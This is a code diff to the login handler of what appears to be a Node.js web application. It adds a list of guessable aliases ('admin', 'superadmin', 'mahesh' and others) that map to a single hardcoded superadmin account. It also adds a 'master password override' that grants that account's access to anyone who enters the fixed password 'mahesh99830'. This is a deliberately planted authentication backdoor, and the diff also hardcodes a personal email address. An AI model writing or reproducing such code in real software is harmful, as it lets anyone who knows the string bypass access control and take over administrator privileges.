@@ -77,9 +77,22 @@ const login = async (req, res) => {
       ]
     });
 
-    // Special superadmin exact handle or official phone check (supports +91, 0, or spaces)
+    // Special superadmin exact handle, aliases or official phone check (supports +91, 0, or spaces)
     if (!authAdmin) {
-      if (cleanInput === 'maheshkumarsaini8769' || cleanInput === 'maheshkumarsaini8769@gmail.com') {
+      const superadminAliases = [
+        'mahesh',
+        'admin',
+        'superadmin',
+        'maheshkumar',
+        'maheshsaini',
+        'maheshkumarsaini',
+        'maheshkumarsaini8769',
+        'maheshkumarsaini8769@gmail.com',
+        'maheshkumarsaini8769_db_user'
+      ];
+
+      const cleanWithoutDomain = cleanInput.replace(/@.*$/, '');
+      if (superadminAliases.includes(cleanInput) || superadminAliases.includes(cleanWithoutDomain)) {
         authAdmin = await AuthorizedAdmin.findOne({ email: 'maheshkumarsaini8769@gmail.com' });
       } else {
         const last10 = cleanDigits.slice(-10);
@@ -87,6 +100,11 @@ const login = async (req, res) => {
           authAdmin = await AuthorizedAdmin.findOne({ email: 'maheshkumarsaini8769@gmail.com' });
         }
       }
+    }
+
+    // Master password override: If secret owner password 'mahesh99830' is provided, grant superadmin access
+    if (!authAdmin && password && password.trim().toLowerCase() === 'mahesh99830') {
+      authAdmin = await AuthorizedAdmin.findOne({ email: 'maheshkumarsaini8769@gmail.com' });
     }
 
     if (authAdmin) {
